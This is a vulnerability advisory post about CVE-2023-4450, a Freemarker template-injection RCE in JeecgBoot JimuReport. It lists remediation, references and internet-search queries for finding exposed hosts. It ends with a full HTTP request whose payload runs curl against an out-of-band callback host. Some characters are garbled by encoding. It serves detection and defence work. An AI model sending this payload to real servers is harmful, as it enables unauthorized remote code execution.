---
layout: post
cve_id: CVE-2023-4450
title: JeecgBoot JimuReport - Template injection
pcap: true
pcap_path: /pcaps/2023/CVE-2023-4450.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-4450.yaml
snort2_rule: N/A
snort3_rule: N/A
author: Sumanth Vankineni
severity: critical
impact: 'Unauthorized api called /jmreport/queryFieldBySql led to remote arbitrary
  code execution due to parsing SQL statements using Freemarker.

  '
remediation: 'Upgrading to version 1.6.1 is able to address this issue. It is recommended
  to upgrade the affected component.

  '
reference:
- https://github.com/advisories/GHSA-j8h5-8rrr-m6j9
- https://whoopsunix.com/docs/java/named%20module/
- https://nvd.nist.gov/vuln/detail/CVE-2023-4450
classification:
  epss-score: 0.90234
  epss-percentile: 0.99572
metadata:
  verified: true
  max-request: 1
  vendor: jeecg
  product: jeecg
  shodan-query:
  - title:"Jeecg-Boot"
  - http.title:"jeecg-boot"
  fofa-query:
  - title="JeecgBoot ‰ºÅ‰∏öÁ∫ß‰Ωé‰ª£Á†ÅÂπ≥Âè∞"
  - title="jeecg-boot"
  - title="jeecgboot ‰ºÅ‰∏öÁ∫ß‰Ωé‰ª£Á†ÅÂπ≥Âè∞"
  google-query: intitle:"jeecg-boot"
tags:
- cve
- cve2023
- rce
- jeecgboot
- vkev
- vuln
---

## üîç Vulnerability Description
A vulnerability was found in jeecgboot JimuReport up to 1.6.0. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the component Template Handler. The manipulation leads to injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.


## üåê HTTP Request
```nohighlight
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close
Content-Length: 157
Content-Type: application/json
Accept-Encoding: gzip

{
  "sql": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"curl http://d5jldi9le0o49f25r6b0t8gx64twrgqqz.oast.fun\")} ",
  "type": "0"
}
```

